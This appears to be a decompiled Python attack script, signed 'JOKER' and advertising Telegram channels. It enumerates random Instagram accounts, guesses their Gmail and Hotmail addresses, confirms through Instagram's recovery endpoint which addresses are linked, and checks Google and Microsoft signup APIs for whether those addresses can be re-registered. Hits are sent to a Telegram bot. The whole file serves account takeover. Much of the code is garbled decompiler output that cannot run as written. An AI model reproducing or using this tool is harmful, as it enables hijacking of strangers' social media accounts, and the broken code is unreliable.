# BY JOKER | @JokerPy 
import sys
from datetime import datetime
EXPIRE_TIME = '2024-10-22 00:00:00'
EXPIRE_MSG = '''[!] This file is expired!
تم خلص الوقت حبي راسل وطن لتفعيل

    '''

def check_expiration():
    current_time = datetime.now()
    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')
    if current_time > expiration_time:
        print(EXPIRE_MSG)
        sys.exit(1)
        return None

check_expiration()
import requests
import random
import json
import string
import os
import re
import hashlib
import uuid
import sys
import webbrowser
from threading import Thread
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
from requests import get
from cfonts import render, say
red = '[1m[31m'
green = '[1m[32m'
yellow = '[1m[33m'
blue = '[1m[34m'
cyan = '[1m[36m'
magenta = '[1m[35m'
M = '[1m[36m'
white = '[1m[37m'
orange = '[1m[38;5;208m'
reset = '[0m'
P = '[1;97m'
E = '[1;31m'
X = '[1;33m'
F = '[2;32m'
f = '[2;35m'
B = '[2;36m'
Y = '[1;34m'
Ca = '[1;97m'
y = '[1;35m'
a32 = '[38;5;180m'
a14 = '[38;5;153m'
uk = [
    X,
    F,
    f,
    Y,
    B,
    Ca,
    y]
co1 = random.choice(uk)
col2 = random.choice(uk)
col3 = random.choice(uk)
col4 = random.choice(uk)
col5 = random.choice(uk)
aca = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
WT1 = render('BOT', colors = [
    'yellow',
    'white'], align = 'center')
print('[38;5;208m⇼' * 60)
print(WT1)
print('[38;5;208m⇼' * 60)
ID = input(f'''\n{a32} Enter Id Telegram : ''')
token = input(f'''\n{a14} Enter Token Bot Telegram : ''')
webbrowser.open('https://t.me/S_VD11')
os.system('clear')

def pppp():
    os.system('clear')
    output = f'''\r{co1}      < ¦ {F}True : {Ca}{hits} ~ {E}False {Ca}{badinsta} - {X}Good Gmail - {Ca}{goodig} ¦ >{P}'''
    sys.stdout.write(output)
    sys.stdout.flush()

a = []['\n'][f'''{cyan}''']['— — — — — — — — — — — — —\n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['1'][f'''{white}'''][' - '][f'''{yellow}''']['2011                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['2'][f'''{white}'''][' - '][f'''{yellow}''']['2012                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['3'][f'''{white}'''][' - '][f'''{yellow}''']['2013                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['4'][f'''{white}'''][' - '][f'''{yellow}''']['2014 '][f'''{white}''']['~ '][f'''{yellow}''']['2023                  '][f'''{cyan}''']['              \n']([]['\n'][f'''{cyan}''']['— — — — — — — — — — — — —\n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['1'][f'''{white}'''][' - '][f'''{yellow}''']['2011                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['2'][f'''{white}'''][' - '][f'''{yellow}''']['2012                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['3'][f'''{white}'''][' - '][f'''{yellow}''']['2013                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['4'][f'''{white}'''][' - '][f'''{yellow}''']['2014 '][f'''{white}''']['~ '][f'''{yellow}''']['2023                  '][f'''{cyan}''']['              \n'][f'''{cyan}''']([]['\n'][f'''{cyan}''']['— — — — — — — — — — — — —\n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['1'][f'''{white}'''][' - '][f'''{yellow}''']['2011                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['2'][f'''{white}'''][' - '][f'''{yellow}''']['2012                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['3'][f'''{white}'''][' - '][f'''{yellow}''']['2013                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['4'][f'''{white}'''][' - '][f'''{yellow}''']['2014 '][f'''{white}''']['~ '][f'''{yellow}''']['2023                  '][f'''{cyan}''']['              \n'][f'''{cyan}''']['— — — — — — — — — — — — —\n']))
WAT = input(' - To Choose : ')
webbrowser.open()
WAT = input(' - To Choose : ')
webbrowser.open('https://t.me/S_VD11')
os.system('clear')
if WAT == '1':
    bbk = 10000
    id = 17699999
if WAT == '2':
    bbk = 17699999
    id = 263014407
if WAT == '3':
    bbk = 263014407
    id = 361365133
if WAT == '4':
    bbk = 361365133
    id = 0x4F2D6C20AL
exit()
res = requests.get('https://signup.live.com/signup')
amsc = res.cookies.get_dict().get('amsc')
canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
cookies = {
    'amsc': amsc }
headers = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'referer': 'https://signup.live.com/signup?lic=1&uaid=f26d1e8726944e3f9cc96aafdfdf8225',
    'origin': 'https://signup.live.com',
    'canary': canary,
    'accept': 'application/json',
    'authority': 'signup.live.com' }
json_data = {
    'clientExperiments': [
        {
            'treatments': [
                'enablejspublickeydeprecationexperiment_treatment'],
            'control': 'enablejspublickeydeprecationexperiment_control',
            'parallax': 'enablejspublickeydeprecationexperiment' }] }
response = requests.post('https://signup.live.com/API/EvaluateExperimentAssignments', cookies = cookies, headers = headers, json = json_data).json()
canary = response['apiCanary']
[]['\n'][f'''{cyan}''']['— — — — — — — — — — — — —\n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['1'][f'''{white}'''][' - '][f'''{yellow}''']['2011                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['2'][f'''{white}'''][' - '][f'''{yellow}''']['2012                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['3'][f'''{white}'''][' - '][f'''{yellow}''']['2013                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['4'][f'''{white}'''][' - '][f'''{yellow}''']['2014 '][f'''{white}''']['~ '][f'''{yellow}''']['2023                  '][f'''{cyan}''']
a = 'https://www.instagram.com/accounts/login'
session = requests.Session()
aa = session.get(a)
csrf = aa.cookies.get('csrftoken')
[]['\n'][f'''{cyan}''']['— — — — — — — — — — — — —\n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['1'][f'''{white}'''][' - '][f'''{yellow}''']['2011                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['2'][f'''{white}'''][' - '][f'''{yellow}''']['2012                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['3'][f'''{white}'''][' - '][f'''{yellow}''']['2013                             '][f'''{cyan}''']['        \n'][f'''{cyan}''']['| '][f'''{orange}''']['☑ '][f'''{blue}''']['4'][f'''{white}'''][' - '][f'''{yellow}''']['2014 '][f'''{white}''']['~ '][f'''{yellow}''']['2023                  ']
yy = 'azertyuiopmlkjhgfdsqwxcvbn'

def tll():
    n1 = (lambda .0: for i in .0:
cc(yy)None)(range(rr(6, 9))())
    n2 = (lambda .0: for i in .0:
cc(yy)None)(range(rr(3, 9))())
    host = (lambda .0: for i in .0:
cc(yy)None)(range(rr(15, 30))())
    he3 = {
        'user-agent': str(ggb()),
        'google-accounts-xsrf': '1',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
        'accept': '*/*' }
    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers = he3)
    tok = re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies = {
        '__Host-GAPS': host }
    headers = {
        'user-agent': ggb(),
        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
        'origin': 'https://accounts.google.com',
        'google-accounts-xsrf': '1',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept-language': 'en-US,en;q=0.9',
        'accept': '*/*',
        'authority': 'accounts.google.com' }
    data = {
        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        'f.req': f'''["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]''' }
    response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies = cookies, headers = headers, data = data)
    tl = str(response.text).split('",null,"')[1].split('"')[0]
    host = response.cookies.get_dict()['__Host-GAPS']
    f = open('tl.txt', 'w')
    f.write(f'''{tl}//{host}\n''')
    None(None, None)
    return None
    if not ''.join:
        pass
    ''.join
    ''.join
    return None
    if Exception:
        e = None
        print(e)
        tll()
        e = None
        del e
        return None
    e = None
    del e

tll()

def check_gmail(email):
    global hits, bademail
    if '@' in email:
        email = str(email).split('@')[0]
    o = open('tl.txt', 'r').read().splitlines()[0]
    o = open('tl.txt', 'r').read().splitlines()[0]
    (tl, host) = o.split('//')
    cookies = {
        '__Host-GAPS': host }
    headers = {
        'user-agent': ggb(),
        'referer': f'''https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}''',
        'origin': 'https://accounts.google.com',
        'google-accounts-xsrf': '1',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept-language': 'en-US,en;q=0.9',
        'accept': '*/*',
        'authority': 'accounts.google.com' }
    params = {
        'TL': tl }
    data = f'''continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'''
    response = pp('https://accounts.google.com/_/signup/usernameavailability', params = params, cookies = cookies, headers = headers, data = data)
    if '"gf.uar",1' in str(response.text):
        hits += 1
        pppp()
        if '@' not in email:
            ok = email + '@gmail.com'
            (username, gg) = ok.split('@')
            InfoAcc(username, gg)
            return None
        (username, gg) = None.split('@')
        InfoAcc(username, gg)
        return None
    None += 1
    pppp()
    return None


def hotmail(email):
    global hits, bademail
    cookies = {
        'amsc': amsc }
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'referer': 'https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8',
        'origin': 'https://signup.live.com',
        'canary': canary }
    json_data = {
        'signInName': email }
    response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies = cookies, headers = headers, json = json_data).text
    if '"isAvailable":true' in response:
        hits += 1
        pppp()
        (username, gg) = email.split('@')
        InfoAcc(username, gg)
        return None
    None += 1
    pppp()


def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'User-Agent': ua }
    data = {
        'ig_sig_key_version': '4',
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            'query': email,
            'device_id': device_id,
            'guid': uui,
            'adid': uui,
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj' }) }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers = headers, data = data).text
    if email in response:
        if '@hotmail.com' in email:
            hotmail(email)
        if '@gmail.com' in email:
            check_gmail(email)
        goodig += 1
        pppp()
        return None
    None += 1
    pppp()


def rest(user):
    headers = {
        'Content-Length': '356',
        'Connection': 'keep-alive' }
    data = {
        'ig_sig_key_version': '4',
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + user + '"}' }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers = headers, data = data).json()
    r = response['email']
    'Liger'
    r = 'no REST !'
    return r


def date(hy):
    ranges = [
        (1279000, 2010),
        (17750000, 2011),
        (279760000, 2012),
        (900990000, 2013),
        (1629010000, 2014),
        (0x9502F900L, 2015),
        (0xDD5A16B2L, 2016),
        (0x153BBD201L, 2017),
        (0x2007A242DL, 2018),
        (0x4F2D6C20AL, 2019)]
    for upper, year in ranges:
        if hy <= upper:
            year
            return None
        return 2023
        if Exception:
            return None


def InfoAcc(username, gg):
    global aca
    headers = {
        'user-agent': str(generate_user_agent()),
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'referer': 'https://storiesig.info/',
        'priority': 'u=1, i',
        'origin': 'https://storiesig.info',
        'accept-language': 'en-US,en;q=0.9',
        'accept': 'application/json, text/plain, */*' }
    rrr = requests.get(f'''https://api-ig.storiesig.info/api/userInfoByUsername/{username}''', headers = headers).json()
    if Exception:
        e = None
        rrr = { }
        e = None
        del e
        e = None
        del e
    Id = rrr.get('result', { }).get('user', { }).get('pk', 'none')
    fows = rrr.get('result', { }).get('user', { }).get('follower_count', 'none')
    fowg = rrr.get('result', { }).get('user', { }).get('following_count', 'none')
    pp = rrr.get('result', { }).get('user', { }).get('media_count', 'none')
    if Id != 'none':
        pass
    hy = None
    if hy:
        pass
    datte = 'none'
    date(hy)
    datte = 'none'
    aca += 1
    tlg = f'''\n— — — — — Account — — — —\n- Hit : {aca}\n- Email : {username}@{gg}\n- Reset : {rest(username)}\n— — — — — — Info — — — — —\n- Domin : {gg}\n- Followers : {fows}\n- Following : {fowg}\n- Posts : {pp}\n- Username : {username}\n- The Date  : {datte}\n— — — — — — Dev — — — — — —\n-  Photo : @WatanPy\n'''
    ff = open('hits.txt', 'a')
    ff.write(f'''{tlg}\n''')
    None(None, None)
    if not int(Id):
        pass
    requests.get(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}''')
    return None
    return None
    if Exception:
        e = None
        e = None
        del e
        return None
    e = None
    del e


def gg():
    data = {
        'doc_id': '25618261841150840',
        'variables': json.dumps({
            'render_surface': 'PROFILE',
            'id': int(random.randrange(bbk, id)) }),
        'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k = 32)) }
    response = requests.post('https://www.instagram.com/api/graphql', headers = {
        'X-FB-LSD': data['lsd'] }, data = data)
    username = response.json().get('data', { }).get('user', { }).get('username')
    emails = [
        username + '@hotmail.com',
        username + '@gmail.com']
    for email in emails:
        check(email)

for _ in range(15):
    Thread(target = gg).start()
    return None
